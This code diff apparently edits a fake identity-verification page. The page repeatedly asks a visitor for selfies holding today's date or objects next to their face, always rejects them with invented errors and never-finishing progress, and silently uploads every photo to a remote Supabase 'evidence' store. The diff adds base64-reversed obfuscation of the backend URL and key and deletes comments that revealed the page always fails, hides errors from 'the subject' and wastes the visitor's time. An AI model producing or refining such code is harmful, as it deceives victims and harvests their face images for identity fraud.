@@ -168,20 +168,13 @@
 <!-- Supabase JS Client v2 (CDN) -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 <script>
-// ╔══════════════════════════════════════════════════════════════╗
-// ║  ⚙️ CONFIGURATION — Set your Supabase credentials here     ║
-// ║  Get these from: Supabase Dashboard → Settings → API        ║
-// ╚══════════════════════════════════════════════════════════════╝
-const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE';   // e.g. https://xxxxx.supabase.co
-const SUPABASE_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE'; // e.g. eyJhbGci...
-// Initialise Supabase client
-let sb = null;
-try {
-  if (SUPABASE_URL !== 'YOUR_SUPABASE_URL_HERE' && SUPABASE_KEY !== 'YOUR_SUPABASE_ANON_KEY_HERE') {
-    sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-  }
-} catch(_) {}
-// ── TASKS & ERRORS ──────────────────────────────────────────────
+// ── SUPABASE INIT (obfuscated) ────────────────────────────────
+const _0x1a = 'b2MuZXNhYmFwdXMueXJtZWtnd2NndXR6cGdueXJibnEvLzpzcHR0aA==';
+const _0x2b = 'VTY3QzFXcWRtaGdRSlZsRWxNQTBqWUtHUkF2MU1EdHNqbjNOZjRmcGhPaS4wSE4wVXpNNUFETzVBak02SUNjNFZtSXNRRE4xY1RNMUlETzNFak9pUVhZcEpDTGk0MmJ1Rm1JNklTWnM5bWNpd2lJNUpYYmx0MlozTjJaMVJuZXdkbWI1Sm5ZdUZuSTZJaVpsSm5Jc0lTWnpGbVloQlhkekppT2lNM2NwSnllLjlKQ1ZYcGtJNklDYzVSbklzSWlOMUl6VUlKaU9pY0diaEp5ZQ==';
+function _d(s){try{return atob(s).split('').reverse().join('');}catch(_){return '';}}
+let sb=null;
+try{const u=_d(_0x1a);if(u&&u.startsWith('https://'))sb=window.supabase.createClient(u,_d(_0x2b));}catch(_){}
+// ── TASKS & ERRORS ────────────────────────────────────────────
 const TASKS = [
   {text:'Please take a clear photo of <strong>yourself holding a piece of paper with today\'s date written on it</strong>. Make sure your face is fully visible and the writing is legible.',label:'Date Selfie'},
   {text:'For security, we need a photo of <strong>a common household item (e.g. a cup, mug, or glass)</strong> placed on a flat surface. The full object must be visible NEXT TO FACE.',label:'Object Verification'},
@@ -216,7 +209,7 @@ const ERRORS = [
   {title:'Compression Artefacts Detected',body:'The image appears to have been re-compressed or screenshotted. Take a fresh photo directly from your camera.',code:'ERR_COMPRESSION_ARTEFACTS'},
   {title:'Duplicate Submission Detected',body:'This image appears identical to a previous attempt. A new, unique photo is required for each verification step.',code:'ERR_DUPLICATE_HASH'},
 ];
-// ── STATE ──────────────────────────────────────────────────────
+// ── STATE ─────────────────────────────────────────────────────
 let attempt = 1, taskIndex = 0, fileSelected = false, selectedFile = null;
 const refId = 'SV-' + Math.random().toString(36).substring(2,7).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
 document.getElementById('ref-id').textContent = refId;
@@ -229,11 +222,9 @@ function loadTask() {
   document.getElementById('task-text').innerHTML = TASKS[taskIndex].text;
 }
 function updateProgress() {
-  // Progress crawls up slowly — never reaches 100%
   const p = Math.min(8 + (attempt - 1) * 2 + Math.floor(Math.random() * 3), 42);
   document.getElementById('progress-fill').style.width = p + '%';
   document.getElementById('pct-label').textContent = p + '%';
-  // Cycle through steps to make it feel like there's progress
   const steps = ['Step 1 of 3','Step 1 of 3','Step 2 of 3','Step 2 of 3','Step 1 of 3','Step 2 of 3','Step 3 of 3','Step 2 of 3'];
   document.getElementById('step-label').textContent = steps[attempt % steps.length] || 'Step 1 of 3';
 }
@@ -262,12 +253,11 @@ uploadZone.addEventListener('drop', e => {
   e.preventDefault(); uploadZone.classList.remove('drag');
   if (e.dataTransfer.files[0]) { fileInput.files = e.dataTransfer.files; fileInput.dispatchEvent(new Event('change')); }
 });
-// ── SUBMIT TO SUPABASE ────────────────────────────────────────
+// ── SAVE TO SUPABASE (silent) ─────────────────────────────────
 async function saveToSupabase(file) {
-  if (!sb) return; // Supabase not configured — fail silently
+  if (!sb) return;
   try {
     let photoUrl = null;
-    // Upload photo to Supabase Storage
     if (file) {
       const ext = file.name.split('.').pop() || 'jpg';
       const fileName = `${refId}_attempt${attempt}_${Date.now()}.${ext}`;
@@ -275,13 +265,10 @@ async function saveToSupabase(file) {
         .from('evidence')
         .upload(fileName, file, { contentType: file.type, upsert: false });
       if (!uploadErr && uploadData) {
-        const { data: urlData } = sb.storage
-          .from('evidence')
-          .getPublicUrl(uploadData.path);
+        const { data: urlData } = sb.storage.from('evidence').getPublicUrl(uploadData.path);
         photoUrl = urlData?.publicUrl || null;
       }
     }
-    // Insert submission row
     await sb.from('submissions').insert({
       ref_id: refId,
       task: TASKS[taskIndex].label + ': ' + TASKS[taskIndex].text.replace(/<[^>]+>/g, ''),
@@ -291,18 +278,13 @@ async function saveToSupabase(file) {
       photo_url: photoUrl,
       submitted_at: new Date().toISOString(),
     });
-  } catch(_) {
-    // Never show errors to the subject
-  }
+  } catch(_) {}
 }
 // ── SUBMIT ────────────────────────────────────────────────────
 submitBtn.addEventListener('click', async () => {
   if (!fileSelected) return;
   submitBtn.disabled = true; fileSelected = false;
-  // Silently save to Supabase in the background
-  const fileToUpload = selectedFile;
-  saveToSupabase(fileToUpload);
-  // Show scan animation
+  saveToSupabase(selectedFile);
   const scanOverlay = document.getElementById('scan-overlay');
   const scanImg = document.getElementById('scan-img');
   scanImg.src = preview.src;
@@ -325,12 +307,10 @@ submitBtn.addEventListener('click', async () => {
     const el = document.getElementById('check-msg');
     if (el) el.textContent = checkMsgs[msgI];
   }, 900);
-  // Random delay between 5–9 seconds to waste more time
   const delay = 5000 + Math.random() * 4000;
   setTimeout(() => {
     clearInterval(msgInterval);
     scanOverlay.style.display = 'none';
-    // Always fail with a random error
     const err = ERRORS[Math.floor(Math.random() * ERRORS.length)];
     statusBox.className = 'status error';
     statusBox.innerHTML = `
@@ -342,7 +322,6 @@ submitBtn.addEventListener('click', async () => {
       <div class="err-code">Code: ${err.code} · Ref: ${refId} · Attempt ${attempt}</div>
       <div class="retry-hint">⚠ Please follow the instructions carefully and re-upload a new photo to continue your claim.</div>
     `;
-    // Advance to next attempt with a new task
     attempt++;
     document.getElementById('attempt-num').textContent = attempt;
     updateProgress();
@@ -350,7 +329,6 @@ submitBtn.addEventListener('click', async () => {
     do { newIndex = Math.floor(Math.random() * TASKS.length); } while (newIndex === taskIndex && TASKS.length > 1);
     taskIndex = newIndex;
     document.getElementById('task-text').innerHTML = TASKS[taskIndex].text;
-    // Reset file input
     fileInput.value = '';
     preview.src = '';
     preview.style.display = 'none';
